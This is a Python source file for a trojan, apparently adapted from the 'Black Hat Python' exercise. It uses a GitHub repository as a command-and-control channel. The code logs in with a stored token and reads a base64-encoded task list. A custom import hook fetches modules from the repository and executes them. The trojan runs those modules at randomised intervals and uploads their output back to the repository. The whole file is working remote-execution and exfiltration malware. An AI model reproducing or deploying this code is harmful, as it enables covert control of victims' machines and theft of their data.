import asyncio
import base64
import json
import random
import sys
from datetime import datetime
from importlib.abc import Loader, MetaPathFinder
from importlib.util import spec_from_loader

import github3


def github_connect():
    with open("mytoken.txt") as f:
        token = f.read()
    user = "LesPrimus"
    sess = github3.login(token=token)
    return sess.repository(user, 'BHP')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class AsyncTrojan:
    def __init__(self,  idx):
        self.idx = idx
        self.config_file = f'{idx}.json'
        self.data_path = f'data/{idx}/'
        self.repo = github_connect()

    async def get_config(self):
        remote_config = await asyncio.to_thread(
            get_file_contents, 'bhptrojan/config', self.config_file, self.repo
        )
        config = json.loads(base64.b64decode(remote_config))
        for task in config:
            if (module := task['module']) not in sys.modules:
                exec(f"import {module}")
        return config

    async def module_runner(self, module_name):
        result = sys.modules[module_name].run()
        await self.store_module_result(result)

    async def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'bhptrojan/data/{self.idx}/{message}.data'
        bindata = bytes(str(data), 'utf-8')
        await asyncio.to_thread(
            self.repo.create_file, remote_path, message, base64.b64encode(bindata)
        )

    async def run(self):
        while True:
            config = await self.get_config()
            for job in config:
                asyncio.create_task(self.module_runner(job["module"]))
                await asyncio.sleep(random.randint(1, 10))
            await asyncio.sleep(random.randint(30 * 60, 3 * 60 * 60))


class GitImportLoader(Loader):
    def __init__(self, data):
        self.data = data

    def exec_module(self, module):
        exec(self.data, module.__dict__)


class GitImporter(MetaPathFinder):

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        repo = github_connect()
        new_library = get_file_contents("bhptrojan/modules", f"{fullname}.py", repo)
        if new_library is not None:
            decoded_module = base64.b64decode(new_library)
            return spec_from_loader(fullname, GitImportLoader(decoded_module))
        return None


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = AsyncTrojan('abc')
    asyncio.run(trojan.run())
